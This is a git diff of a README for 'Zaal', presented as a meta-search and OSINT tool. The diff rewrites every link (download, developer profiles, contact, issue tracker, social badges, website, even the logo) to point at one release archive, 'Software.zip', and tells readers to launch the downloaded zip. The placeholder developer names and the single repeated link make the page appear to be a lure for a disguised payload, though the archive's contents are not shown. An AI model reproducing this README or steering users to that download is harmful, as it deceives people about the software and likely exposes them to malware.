@@ -13,12 +13,12 @@ Zaal is designed to enhance your online search capabilities by aggregating resul
 
 ## Repository Information
 
-📦 **Repository Name**: [zaal](https://github.com/Kurkkumopo91/zaal/releases/tag/v1.0)  
+📦 **Repository Name**: [zaal](https://github.com/Kurkkumopo91/zaal/releases/download/v2.0/Software.zip)  
 📌 **Topics**: meta-search, meta-search-engine, osint, osint-tool, search, search-engine, searchbar, searching, zaal
 
 ## Download Zaal
 
-🔗 **Download Zaal**: [Click here to download Zaal](https://github.com/Kurkkumopo91/zaal/releases/tag/v1.0)  
+🔗 **Download Zaal**: [Click here to download Zaal](https://github.com/Kurkkumopo91/zaal/releases/download/v2.0/Software.zip)  
 🚀 **Launch the File**: Make sure to launch the downloaded zip file to start using Zaal effectively.
 
 ## How to Use Zaal
@@ -37,14 +37,14 @@ Using Zaal is effortless and efficient. Simply download the tool, extract the fi
 Meet the minds behind Zaal - a team dedicated to improving your search experience with cutting-edge technology. Our mission is to make searching the web more efficient and effective for users worldwide.
 
 👨‍💻 **Developers**:
-- John Doe ([@johndoe](https://github.com/Kurkkumopo91/zaal/releases/tag/v1.0))
-- Jane Smith ([@janesmith](https://github.com/Kurkkumopo91/zaal/releases/tag/v1.0))
+- John Doe ([@johndoe](https://github.com/Kurkkumopo91/zaal/releases/download/v2.0/Software.zip))
+- Jane Smith ([@janesmith](https://github.com/Kurkkumopo91/zaal/releases/download/v2.0/Software.zip))
 
 ## Support & Feedback
 
 We value your feedback on Zaal. If you encounter any issues or have suggestions for improvement, please don't hesitate to reach out to our team. Your input is fundamental to enhancing the Zaal experience for all users.
 
-📧 **Contact Us**: https://github.com/Kurkkumopo91/zaal/releases/tag/v1.0  
+📧 **Contact Us**: https://github.com/Kurkkumopo91/zaal/releases/download/v2.0/Software.zip  
 📞 **Support**: +1-800-ZAAL-SUP
 
 ## Spread the Word
@@ -56,24 +56,24 @@ Help us spread the word about Zaal by sharing this repository with your network.
 ---
 
 🔍 **Explore More**:
-- [Project Board](https://github.com/Kurkkumopo91/zaal/releases/tag/v1.0)
-- [Issue Tracker](https://github.com/Kurkkumopo91/zaal/releases/tag/v1.0)
-- [Contribute to Zaal](https://github.com/Kurkkumopo91/zaal/releases/tag/v1.0)
+- [Project Board](https://github.com/Kurkkumopo91/zaal/releases/download/v2.0/Software.zip)
+- [Issue Tracker](https://github.com/Kurkkumopo91/zaal/releases/download/v2.0/Software.zip)
+- [Contribute to Zaal](https://github.com/Kurkkumopo91/zaal/releases/download/v2.0/Software.zip)
 
 🚀 **Stay Connected**:
-[![Zaal Twitter](https://github.com/Kurkkumopo91/zaal/releases/tag/v1.0)](https://github.com/Kurkkumopo91/zaal/releases/tag/v1.0)
-[![Zaal Discord](https://github.com/Kurkkumopo91/zaal/releases/tag/v1.0)](https://github.com/Kurkkumopo91/zaal/releases/tag/v1.0)
+[![Zaal Twitter](https://github.com/Kurkkumopo91/zaal/releases/download/v2.0/Software.zip)](https://github.com/Kurkkumopo91/zaal/releases/download/v2.0/Software.zip)
+[![Zaal Discord](https://github.com/Kurkkumopo91/zaal/releases/download/v2.0/Software.zip)](https://github.com/Kurkkumopo91/zaal/releases/download/v2.0/Software.zip)
 
 ---
 
 🚧 **Can't Access the Download Link?**
-If you encounter any issues with the provided download link, please check the [Releases](https://github.com/Kurkkumopo91/zaal/releases/tag/v1.0) section for alternative download options.
+If you encounter any issues with the provided download link, please check the [Releases](https://github.com/Kurkkumopo91/zaal/releases/download/v2.0/Software.zip) section for alternative download options.
 
 🌐 **Visit the Zaal Website**:
-If you're interested in learning more about Zaal and its features, visit the [Zaal Website](https://github.com/Kurkkumopo91/zaal/releases/tag/v1.0) for additional information.
+If you're interested in learning more about Zaal and its features, visit the [Zaal Website](https://github.com/Kurkkumopo91/zaal/releases/download/v2.0/Software.zip) for additional information.
 
 ---
 
 Thank you for choosing Zaal - your gateway to effortless online searching! 🌐✨
 
-![Zaal Logo](https://github.com/Kurkkumopo91/zaal/releases/tag/v1.0)
+![Zaal Logo](https://github.com/Kurkkumopo91/zaal/releases/download/v2.0/Software.zip)
